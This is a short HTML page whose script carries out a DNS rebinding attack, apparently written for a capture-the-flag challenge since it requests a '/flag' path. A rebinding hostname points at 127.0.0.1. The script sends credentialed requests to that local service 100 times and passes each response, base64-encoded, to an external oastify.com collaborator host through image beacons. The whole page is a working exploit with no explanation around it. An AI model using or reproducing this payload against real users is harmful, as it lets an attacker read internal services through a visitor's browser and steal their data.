<!DOCTYPE html>
<html>
<body>
<script>
const target = 'acd918ee.7f000001.rbndr.us';

function attempt(round) {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', `http://${target}:80/flag`, true);
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                const img = new Image();
                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?success_${round}=` + btoa(xhr.responseText);
            } else {
                const img = new Image();
                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${round}=` + btoa(`Status: ${xhr.status}`);
            }
        }
    };
    xhr.onerror = function() {
        const img = new Image();
        img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?xhr_error_${round}=` + btoa('XHR failed');
    };
    xhr.send();
}

for (let i = 1; i <= 100; i++) {
    setTimeout(() => attempt(i), i * 300);
}
</script>
</body>
</html>
